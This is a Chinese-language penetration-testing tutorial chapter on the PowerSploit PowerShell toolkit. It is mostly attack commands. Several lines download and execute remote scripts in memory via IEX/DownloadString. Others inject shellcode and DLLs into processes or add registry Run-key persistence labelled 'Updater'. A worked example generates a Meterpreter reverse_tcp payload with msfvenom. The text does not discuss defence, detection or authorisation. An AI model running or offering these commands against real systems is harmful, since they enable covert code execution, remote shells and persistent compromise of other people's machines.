# 第二十章：PowerSploit - PowerShell安全工具集

## 20.1 PowerSploit 简介

### 什么是 PowerSploit？

PowerSploit是一个PowerShell安全工具集，用于渗透测试和代码执行。

**PowerSploit**包含：
- 代码执行
- 节点内存注入
- Antivirus绕过
- 后渗透模块

简单来说，PowerSploit是**PowerShell渗透工具的集合**。

---

## 20.2 安装教程

### 下载项目

```powershell
# PowerShell中执行
git clone https://github.com/PowerShellMafia/PowerSploit.git
```

### 或直接使用

可以直接从网络加载脚本：
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')
```

---

## 20.3 模块分类详解

### CodeExecution模块

| 模块 | 功能 |
|------|------|
| Invoke-Shellcode | 注入Shellcode |
| Invoke-DllInjection | DLL注入 |
| Invoke-ReflectivePEInjection | 反射PE注入 |

### AntivirusBypass模块

| 模块 | 功能 |
|------|------|
| Find-AVSignature | 查找AV特征码 |

### Persistence模块

| 模块 | 功能 |
|------|------|
| New-UserPersistenceOption | 用户持久化 |
| New-ElevatedPersistenceOption | 系统持久化 |
| Add-Persistence | 添加持久化 |

### Recon模块

| 模块 | 功能 |
|------|------|
| Get-HttpStatus | HTTP状态检查 |
| Invoke-Portscan | 端口扫描 |

---

## 20.4 Invoke-Shellcode详解

### 什么是Shellcode？

Shellcode是一段机器码，可以执行特定功能。

### 注入Shellcode

```powershell
# 加载模块
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')

# 注入Meterpreter Shellcode
Invoke-Shellcode -Shellcode @(<shellcode_bytes>)
```

---

## 20.5 Invoke-DllInjection详解

### DLL注入

```powershell
# 加载模块
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1')

# 注入DLL
Invoke-DllInjection -ProcessID <pid> -Dll <dll_path>
```

---

## 20.6 持久化详解

### 用户级持久化

```powershell
# 加载模块
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Persistence/Persistence.psm1')

# 创建持久化选项
$UserPersistence = New-UserPersistenceOption -RegistryPath 'HKCU:Software\Microsoft\Windows\CurrentVersion\Run' -Description 'Updater' -ScriptBlock { <powershell_code> }

# 添加持久化
Add-Persistence -PersistenceOption $UserPersistence
```

---

## 20.7 端口扫描详解

### Invoke-Portscan

```powershell
# 加载模块
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')

# 端口扫描
Invoke-Portscan -Hosts 192.168.1.1-254 -Ports 22,80,443
```

---

## 20.8 实战案例：内存注入

### 场景说明

注入Shellcode到内存中执行。

### 步骤

**步骤1：生成Shellcode**
使用msfvenom生成：
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f powershell
```

**步骤2：注入Shellcode**
```powershell
# 加载模块
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')

# 注入
Invoke-Shellcode -Shellcode @(<shellcode_bytes>)
```

---

## 总结

本章介绍了PowerSploit的使用：

1. **安装配置**：下载和使用
2. **模块分类**：各种模块功能
3. **Shellcode注入**：Invoke-Shellcode
4. **DLL注入**：Invoke-DllInjection
5. **持久化**：添加持久化
6. **端口扫描**：Invoke-Portscan

PowerSploit是PowerShell渗透测试的重要工具集。

下一章我们将学习更多高级工具！